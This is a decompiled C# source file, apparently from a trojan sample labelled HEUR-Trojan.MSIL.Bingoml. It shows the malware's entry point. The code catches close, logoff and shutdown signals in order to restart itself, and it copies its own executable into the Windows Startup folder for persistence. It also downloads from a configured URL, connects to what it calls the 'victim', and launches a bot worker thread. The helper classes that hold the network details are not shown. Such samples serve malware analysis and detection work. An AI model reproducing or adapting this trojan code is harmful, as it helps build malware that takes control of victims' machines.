// Decompiled with JetBrains decompiler
// Type: LiveEngine.Program
// Assembly: LiveEngine, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 613A71CB-57CC-49C5-976F-14458959D4C9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-8ecc2a19dcbcfe3f7f6e749dca526d6f1c0d277f95a9c2b8df6f81fe3d1a1d1f.exe

using LiveEngine.Helpers;
using LiveEngine.Requests;
using LiveEngine.Settings;
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace LiveEngine
{
  internal class Program
  {
    public static WebClient internet = new WebClient();
    public static bool wasCleared = false;
    private static readonly string AppName = AppDomain.CurrentDomain.FriendlyName;

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    [DllImport("Kernel32")]
    private static extern bool SetConsoleCtrlHandler(
      Program.SetConsoleCtrlEventHandler handler,
      bool add);

    private static bool Handler(Program.CtrlType signal)
    {
      switch (signal)
      {
        case Program.CtrlType.CTRL_C_EVENT:
        case Program.CtrlType.CTRL_BREAK_EVENT:
        case Program.CtrlType.CTRL_CLOSE_EVENT:
        case Program.CtrlType.CTRL_LOGOFF_EVENT:
        case Program.CtrlType.CTRL_SHUTDOWN_EVENT:
          ExceptionHandler.RestartLiveEngine();
          return false;
        default:
          return false;
      }
    }

    private static void Main()
    {
      Program.SetConsoleCtrlHandler(new Program.SetConsoleCtrlEventHandler(Program.Handler), true);
      Program.RegisterInStartup(true);
      Thread.Sleep(1000);
      try
      {
        Thread thread1 = new Thread((ThreadStart) (() => Download.DownloadVideoID(Info.DownloadURLVideoID)));
        thread1.Start();
        thread1.Join();
        Thread thread2 = new Thread((ThreadStart) (() => Upload.ConnectVictim()));
        thread2.Start();
        thread2.Join();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
      new Thread((ThreadStart) (() => Bot.Worker())).Start();
    }

    private static void RegisterInStartup(bool isChecked)
    {
      try
      {
        if (!isChecked || System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\" + Program.AppName))
          return;
        System.IO.File.Move(Program.AppName, Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\" + Program.AppName);
      }
      catch (ArgumentNullException ex)
      {
        ExceptionHandler.RestartLiveEngine();
      }
    }

    private delegate bool SetConsoleCtrlEventHandler(Program.CtrlType sig);

    private enum CtrlType
    {
      CTRL_C_EVENT = 0,
      CTRL_BREAK_EVENT = 1,
      CTRL_CLOSE_EVENT = 2,
      CTRL_LOGOFF_EVENT = 5,
      CTRL_SHUTDOWN_EVENT = 6,
    }
  }
}
